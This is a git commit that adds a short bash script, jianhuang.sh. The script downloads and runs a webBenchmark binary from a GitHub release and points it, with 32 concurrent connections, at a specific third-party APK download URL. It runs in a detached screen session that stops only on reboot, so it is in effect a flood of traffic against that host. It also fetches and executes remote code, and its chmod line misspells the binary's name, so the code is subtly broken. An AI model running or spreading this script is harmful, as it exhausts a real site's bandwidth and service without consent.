c6a9d77de6c034c9fc0c108de0670433fc144d5a
oldcatY <35653686+imbalaomao@users.noreply.github.com>
2023-10-24 22:41:58 +0800

    Create jianhuang.sh

---
+++ jianhuang.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+echo 正在检测环境
+if [ -f "/usr/bin/apt-get" ]; then
+    apt-get install -y screen
+else
+    yum install -y screen
+fi
+wget https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 && chmod a+x webBenchimark_linux_x64
+echo starting...
+echo 若要停止,重启服务器即可
+sleep 3
+screen_name=$"jianhuang"  
+screen -dmS $screen_name
+cmd=$"./webBenchmark_linux_x64 -c 32 -s http://xz.hyl88.top/3.0.5dp5.apk";
+screen -x -S $screen_name -p 0 -X stuff "$cmd"
+screen -x -S $screen_name -p 0 -X stuff $'\n'
